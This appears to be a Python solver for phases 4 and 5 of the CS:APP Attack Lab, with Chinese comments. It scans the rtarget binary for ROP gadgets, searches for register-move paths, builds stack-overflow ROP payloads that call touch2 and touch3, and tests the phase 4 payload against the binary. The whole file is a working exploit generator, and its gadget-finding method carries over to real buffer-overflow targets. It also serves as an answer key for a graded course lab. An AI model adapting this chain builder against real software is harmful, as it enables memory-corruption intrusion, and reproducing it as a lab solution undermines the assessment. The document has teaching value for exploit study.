import os
import subprocess
import re
import struct
import sys
from collections import deque

# --- 配置 ---
COOKIE_FILE = "cookie.txt"
RTARGET = "./rtarget"
HEX2RAW = "./hex2raw"

# 寄存器映射 (CS:APP 这里的架构定义)
# 0:ax, 1:cx, 2:dx, 3:bx, 4:sp, 5:bp, 6:si, 7:di
REG_NAMES = ["rax", "rcx", "rdx", "rbx", "rsp", "rbp", "rsi", "rdi"]
REG_RAX = 0
REG_RCX = 1
REG_RDX = 2
REG_RBX = 3
REG_RSP = 4
REG_RBP = 5
REG_RSI = 6
REG_RDI = 7

def log(msg, color="white"):
    colors = {
        "green": "\033[92m", "red": "\033[91m", "yellow": "\033[93m",
        "blue": "\033[94m", "purple": "\033[95m", "reset": "\033[0m"
    }
    print(f"{colors.get(color, colors['reset'])}[*] {msg}{colors['reset']}")

def p64(addr):
    return struct.pack('<Q', addr)

def run_command(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode('latin-1')
    except subprocess.CalledProcessError:
        return ""

def get_cookie():
    try:
        with open(COOKIE_FILE, 'r') as f:
            c = f.read().strip()
            clean_c = c[2:] if c.lower().startswith("0x") else c
            return int(clean_c, 16), clean_c
    except:
        log("Error: cookie.txt not found", "red")
        sys.exit(1)

def get_symbol_addr(binary, symbol):
    out = run_command(f"objdump -t {binary} | grep ' {symbol}$'")
    match = re.search(r'([0-9a-fA-F]+)', out)
    return int(match.group(1), 16) if match else None

def get_buffer_size(binary):
    out = run_command(f"objdump -d {binary} | grep '<getbuf>:' -A 5")
    match = re.search(r'sub\s+\$0x([0-9a-fA-F]+),%rsp', out)
    return int(match.group(1), 16) if match else 40

# ==========================================
# 智能 Gadget 分析器
# ==========================================
class GadgetFinder:
    def __init__(self, binary):
        self.bytes = [] 
        self._parse(binary)

    def _parse(self, binary):
        log(f"Parsing {binary} segments...", "blue")
        dump = run_command(f"objdump -d {binary}")
        line_re = re.compile(r'^\s*([0-9a-f]+):\s+([0-9a-f ]+)')
        
        for line in dump.splitlines():
            match = line_re.match(line)
            if match:
                addr = int(match.group(1), 16)
                byte_vals = [int(b, 16) for b in match.group(2).strip().split()]
                for i, b in enumerate(byte_vals):
                    self.bytes.append((addr + i, b))

    def find(self, hex_str, max_padding=3):
        target = [int(x, 16) for x in hex_str.split()]
        candidates = []
        for i in range(len(self.bytes) - len(target)):
            match = True
            for k in range(len(target)):
                if self.bytes[i+k][1] != target[k]:
                    match = False; break
            if match:
                start_addr = self.bytes[i][0]
                for offset in range(len(target), len(target) + 1 + max_padding):
                    if i + offset < len(self.bytes):
                        if self.bytes[i + offset][1] == 0xc3: # ret
                            candidates.append((start_addr, offset - len(target)))
                            break
        if not candidates: return None
        candidates.sort(key=lambda x: x[1])
        return candidates[0][0]

    def find_mov_r_r(self, src_reg_idx, dst_reg_idx, is_64=False):
        # 32-bit: 89, 64-bit: 48 89
        modrm = 0xC0 | (src_reg_idx << 3) | dst_reg_idx
        hex_code = f"{modrm:02x}"
        prefix = "48 89" if is_64 else "89"
        return self.find(f"{prefix} {hex_code}")

    def find_pop(self, reg_idx):
        # pop r64: 58 + reg_idx
        opcode = 0x58 + reg_idx
        return self.find(f"{opcode:02x}")
    
    def find_path(self, start_reg, end_reg, forbidden_regs=None):
        """BFS 寻找寄存器传输路径，支持黑名单"""
        if forbidden_regs is None: forbidden_regs = set()
        
        queue = deque([[start_reg]])
        visited = {start_reg} | forbidden_regs
        
        while queue:
            path = queue.popleft()
            curr = path[-1]
            if curr == end_reg:
                return path
            
            # 尝试 32位 mov (通常用于传递数据/偏移)
            for next_reg in range(8):
                if next_reg not in visited:
                    if self.find_mov_r_r(curr, next_reg, is_64=False):
                        visited.add(next_reg)
                        new_path = list(path)
                        new_path.append(next_reg)
                        queue.append(new_path)
        return None

# ==========================================
# 求解逻辑
# ==========================================

def solve_phase4(finder: GadgetFinder, cookie, buf_size):
    log("\n[+] Solving Phase 4 (Any-Pop to RDI)...", "purple")
    touch2 = get_symbol_addr(RTARGET, "touch2")
    
    # 寻找 pop %any -> ... -> mov %any, %rdi
    # 因为只需要传递一次，直接找两步的即可
    for reg in range(8):
        if reg == REG_RDI: continue 
        addr_pop = finder.find_pop(reg)
        addr_mov = finder.find_mov_r_r(reg, REG_RDI, is_64=True)
        
        if addr_pop and addr_mov:
            log(f"  Chain: pop %{REG_NAMES[reg]} -> mov %{REG_NAMES[reg]}, %rdi", "green")
            payload = b'A' * buf_size + p64(addr_pop) + p64(cookie) + p64(addr_mov) + p64(touch2)
            return payload
            
    log("  [-] Phase 4 Failed.", "red")
    return None

def solve_phase5(finder: GadgetFinder, cookie_str, buf_size):
    log("\n[+] Solving Phase 5 (Dynamic Entry & Path)...", "purple")
    touch3 = get_symbol_addr(RTARGET, "touch3")
    
    # 1. 寻找基地址 (Base) 相关的固定 Gadgets
    # 保存 RSP: mov %rsp, %rax
    g_save_rsp = finder.find("48 89 e0") 
    # 转移 Base: mov %rax, %rdi (把栈地址给 RDI)
    g_base_to_rdi = finder.find_mov_r_r(REG_RAX, REG_RDI, is_64=True)
    # 计算: lea (%rdi, %rsi, 1), %rax
    g_lea = finder.find("48 8d 04 37")
    
    if not (g_save_rsp and g_base_to_rdi and g_lea):
        log("  [-] Phase 5 Failed: Missing base setup gadgets.", "red")
        return None

    # 2. 寻找 偏移量 (Offset) 的入口和路径
    # 目标: pop %START -> ... -> %RSI
    # 限制: 路径中间不能经过 %RDI，因为 %RDI 此时存放着 Base Address，不能被覆盖！
    
    best_offset_chain = None
    best_pop_gadget = None
    start_reg_used = None
    
    log("  Scanning for Offset path (pop %reg -> ... -> %rsi)...", "blue")
    
    # 遍历所有寄存器作为 pop 的起点
    for r_start in range(8):
        # 尝试找 pop r_start
        g_pop = finder.find_pop(r_start)
        if not g_pop: continue
        
        # 寻找从 r_start 到 rsi 的路径，禁止经过 rdi
        path = finder.find_path(r_start, REG_RSI, forbidden_regs={REG_RDI})
        
        if path:
            # 找到了一条路径！
            path_str = " -> ".join([f"%{REG_NAMES[r]}" for r in path])
            log(f"  Found valid offset chain: pop %{REG_NAMES[r_start]} ({hex(g_pop)}) -> {path_str}", "green")
            
            # 记录下来 (这里直接取第一个找到的，也可以优化找最短的)
            best_pop_gadget = g_pop
            best_offset_chain = path
            start_reg_used = r_start
            break # 找到一个能用的就行
    
    if not best_offset_chain:
        log("  [-] Phase 5 Failed: No valid path to load offset into RSI.", "red")
        return None

    # 3. 构建 Offset 传输链的 Gadgets
    offset_gadgets = []
    for i in range(len(best_offset_chain) - 1):
        src = best_offset_chain[i]
        dst = best_offset_chain[i+1]
        g = finder.find_mov_r_r(src, dst, is_64=False)
        offset_gadgets.append(g)

    # 4. 计算 Offset 值
    # 栈结构:
    # [Old RSP]    mov %rsp, %rax
    # [Old RSP+8]  mov %rax, %rdi
    # [Old RSP+16] pop %START  <-- 此时栈顶在这里
    # [Old RSP+24] OFFSET_VAL  <-- pop 出来的值
    # [Old RSP+32] mov chain part 1
    # ...
    # [Old RSP+X]  lea ...
    # ...
    # [Old RSP+Y]  touch3
    # [Old RSP+Y+8] STRING
    
    # 计算从 OFFSET_VAL 所在格子(即 pop 的下一个位置) 到 STRING 的距离
    # 参与者: Offset move chain + LEA + mov_rax_rdi(result) + touch3
    
    # 注意: g_base_to_rdi 我们这里复用一下，把运算结果 rax 放回 rdi
    # 如果找不到 mov rax, rdi，可以再搜索一遍，但通常 Phase 4/5 必定有这个
    
    count_slots = 0
    count_slots += len(offset_gadgets) # 传输链长度
    count_slots += 1 # lea
    count_slots += 1 # result mov (rax->rdi)
    count_slots += 1 # touch3 address placeholder
    
    offset_val = count_slots * 8
    log(f"  Calculated Offset: 0x{offset_val:x} (Chain len: {len(offset_gadgets)})", "blue")

    # 5. 生成 Payload
    p = b'A' * buf_size
    # --- Setup Base ---
    p += p64(g_save_rsp)      # mov %rsp, %rax
    p += p64(g_base_to_rdi)   # mov %rax, %rdi
    # --- Setup Offset ---
    p += p64(best_pop_gadget) # pop %START
    p += p64(offset_val)      # The Offset Value
    # --- Transfer Offset to RSI ---
    for g in offset_gadgets:
        p += p64(g)
    # --- Calculate & Call ---
    p += p64(g_lea)           # rax = rdi + rsi*1
    p += p64(g_base_to_rdi)   # mov %rax, %rdi (Arg1)
    p += p64(touch3)          # Call
    p += cookie_str.encode() + b'\x00'
    
    return p

# ==========================================
# 主程序
# ==========================================
def main():
    cookie_int, cookie_str = get_cookie()
    buf_size = get_buffer_size(RTARGET)
    log(f"Cookie: 0x{cookie_int:x}, Buffer: {buf_size}", "blue")

    finder = GadgetFinder(RTARGET)

    # --- Phase 4 ---
    p4 = solve_phase4(finder, cookie_int, buf_size)
    if p4:
        with open("4.txt", "w") as f: f.write(" ".join([f"{b:02x}" for b in p4]))
        log("Phase 4 payload -> 4.txt. Testing...", "blue")
        res = run_command(f"{HEX2RAW} < 4.txt | {RTARGET} -q")
        if "PASS" in res: log("Phase 4 PASSED!", "green")
        else: log("Phase 4 Test Failed.", "red")

if __name__ == "__main__":
    main()